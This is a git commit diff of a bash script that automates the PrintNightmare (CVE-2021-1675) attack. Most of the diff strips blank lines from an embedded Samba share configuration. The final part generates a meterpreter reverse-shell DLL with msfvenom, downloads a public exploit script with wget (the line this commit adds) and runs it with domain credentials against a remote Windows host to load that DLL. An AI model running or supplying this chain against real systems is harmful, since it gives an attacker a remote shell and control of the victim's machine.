2e323334d2c3302c032d4ecf44ae44b2035525e0
overgrowncarrot1 <78485709+overgrowncarrot1@users.noreply.github.com>
2022-11-17 20:41:36 -0500

    Update PrintNightmareScript.sh

--- PrintNightmareScript.sh
+++ PrintNightmareScript.sh
@@ -1,4 +1,4 @@
-#!/usr/bin/bash
+#!/bin/bash
 
 #This simple bash script is used to automate the PrintNightmare process and start the different services needed, hopefully it works just as well
 #for you as it has for me. 
@@ -31,51 +31,34 @@ sudo echo '#
 # NOTE: Whenever you modify this file you should run the command
 # "testparm" to check that you have not made any basic syntactic 
 # errors. 
-
 #======================= Global Settings =======================
-
 [global]
-
 ## Browsing/Identification ###
-
 # Change this to the workgroup/NT-domain name your Samba server will part of
    workgroup = WORKGROUP
-
 #### Networking ####
-
 # The specific set of interfaces / networks to bind to
 # This can be either the interface name or an IP address/netmask;
 # interface names are normally preferred
 ;   interfaces = 127.0.0.0/8 eth0
-
 # Only bind to the named interfaces and/or networks; you must use the
 # "interfaces" option above to use this.
 # It is recommended that you enable this feature if your Samba machine is
 # not protected by a firewall or is a firewall itself.  However, this
 # option cannot handle dynamic or non-broadcast interfaces correctly.
 ;   bind interfaces only = yes
-
-
-
 #### Debugging/Accounting ####
-
 # This tells Samba to use a separate log file for each machine
 # that connects
    log file = /var/log/samba/log.%m
-
 # Cap the size of the individual log files (in KiB).
    max log size = 1000
-
 # We want Samba to only log to /var/log/samba/log.{smbd,nmbd}.
 # Append syslog@1 if you want important messages to be sent to syslog too.
    logging = file
-
 # Do something sensible when Samba crashes: mail the admin a backtrace
    panic action = /usr/share/samba/panic-action %d
-
-
 ####### Authentication #######
-
 # Server role. Defines in which mode Samba will operate. Possible
 # values are "standalone server", "member server", "classic primary
 # domain controller", "classic backup domain controller", "active
@@ -86,37 +69,29 @@ sudo echo '#
 # running "samba-tool domain provision" to wipe databases and create a
 # new domain.
    server role = standalone server
-
    obey pam restrictions = yes
-
 # This boolean parameter controls whether Samba attempts to sync the Unix
 # password with the SMB password when the encrypted SMB password in the
 # passdb is changed.
    unix password sync = yes
-
 # For Unix password sync to work on a Debian GNU/Linux system, the following
 # parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
 # sending the correct chat script for the passwd program in Debian Sarge).
    passwd program = /usr/bin/passwd %u
    passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
-
 # This boolean controls whether PAM will be used for password changes
 # when requested by an SMB client instead of the program listed in
 # "passwd program". The default is "no".
    pam password change = yes
-
 # This option controls how unsuccessful authentication attempts are mapped
 # to anonymous connections
    map to guest = bad user
-
 ########## Domains ###########
-
 #
 # The following settings only takes effect if "server role = classic
 # primary domain controller", "server role = classic backup domain controller"
 # or "domain logons" is set 
 #
-
 # It specifies the location of the users
 # profile directory from the client point of view) The following
 # required a [profiles] share to be setup on the samba server (see
@@ -125,40 +100,32 @@ sudo echo '#
 # Another common choice is storing the profile in the users home directory
 # (this is Sambas default)
 #   logon path = \\%N\%U\profile
-
 # The following setting only takes effect if "domain logons" is set
 # It specifies the location of a users home directory (from the client
 # point of view)
 ;   logon drive = H:
 #   logon home = \\%N\%U
-
 # The following setting only takes effect if "domain logons" is set
 # It specifies the script to run during logon. The script must be stored
 # in the [netlogon] share
 # NOTE: Must be store in "DOS" file format convention
 ;   logon script = logon.cmd
-
 # This allows Unix users to be created on the domain controller via the SAMR
 # RPC pipe.  The example command creates a user account with a disabled Unix
 # password; please adapt to your needs
 ; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u
-
 # This allows machine accounts to be created on the domain controller via the 
 # SAMR RPC pipe.  
 # The following assumes a "machines" group exists on the system
 ; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u
-
 # This allows Unix groups to be created on the domain controller via the SAMR
 # RPC pipe.  
 ; add group script = /usr/sbin/addgroup --force-badname %g
-
 ############ Misc ############
-
 # Using the following line enables you to customise your configuration
 # on a per machine basis. The %m gets replaced with the netbios name
 # of the machine that is connecting
 ;   include = /home/samba/etc/smb.conf.%m
-
 # Some defaults for winbind (make sure youre not using the ranges
 # for something else.)
 ;   idmap config * :              backend = tdb
@@ -167,42 +134,32 @@ sudo echo '#
 ;   idmap config YOURDOMAINHERE : range   = 100000-999999
 ;   template shell = /bin/bash
     smb ports = 445
-
 # Setup usershare options to enable non-root users to share folders
 # with the net usershare command.
-
 # Maximum number of usershare. 0 means that usershare is disabled.
 #   usershare max shares = 100
-
 # Allow users whove been granted usershare privileges to create
 # public shares, not just authenticated ones
    usershare allow guests = yes
-
 #======================= Share Definitions =======================
-
 [homes]
    comment = Home Directories
    browseable = no
-
 # By default, the home directories are exported read-only. Change the
 # next parameter to "no" if you want to be able to write to them.
    read only = yes
-
 # File creation mask is set to 0700 for security reasons. If you want to
 # create files with group=rw permissions, set next parameter to 0775.
    create mask = 0700
-
 # Directory creation mask is set to 0700 for security reasons. If you want to
 # create dirs. with group=rw permissions, set next parameter to 0775.
    directory mask = 0700
-
 # By default, \\server\username shares can be connected to by anyone
 # with access to the samba server.
 # The following parameter makes sure that only "username" can connect
 # to \\server\username
 # This might need tweaking when using external authentication schemes
    valid users = %S
-
 # Un-comment the following and create the netlogon directory for Domain Logons
 # (you need to configure Samba to act as a domain controller too.)
 ;[netlogon]
@@ -210,7 +167,6 @@ sudo echo '#
 ;   path = /home/samba/netlogon
 ;   guest ok = yes
 ;   read only = yes
-
 # Un-comment the following and create the profiles directory to store
 # users profiles (see the "logon path" option above)
 # (you need to configure Samba to act as a domain controller too.)
@@ -223,7 +179,6 @@ sudo echo '#
 ;   browseable = no
 ;   create mask = 0600
 ;   directory mask = 0700
-
 [printers]
    comment = All Printers
    browseable = no
@@ -232,7 +187,6 @@ sudo echo '#
    guest ok = no
    read only = yes
    create mask = 0700
-
 # Windows clients look for this share name as a source of downloadable
 # printer drivers
 [print$]
@@ -247,9 +201,7 @@ sudo echo '#
 # Please note that you also need to set appropriate Unix permissions
 # to the drivers directory for these users to have write rights in it
 ;   write list = root, @lpadmin
-
 [public]
-
     comment = Samba
     path = /var/public
     guest ok = yes
@@ -299,15 +251,10 @@ cd impacket
 pip2 install .
 pip3 install .
 python3 ./setup.py install
-
 echo "Creating MSFVenom shell.dll file for 64 bit Windows system"
-
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll > shell.dll
-
 echo "Trying to copy shell.dll to Remote Host"
-
 #If impacket is not within your path, you may need to put the full path below
-
 echo "Trying to pass PrintNightmare to Remote System from $LHOST using Share that should be started"
-
+wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py
 python3 CVE-2021-1675.py $DOMAIN/$USER:$PASS@$REMOTE "\\$LHOST\share\shell.dll"
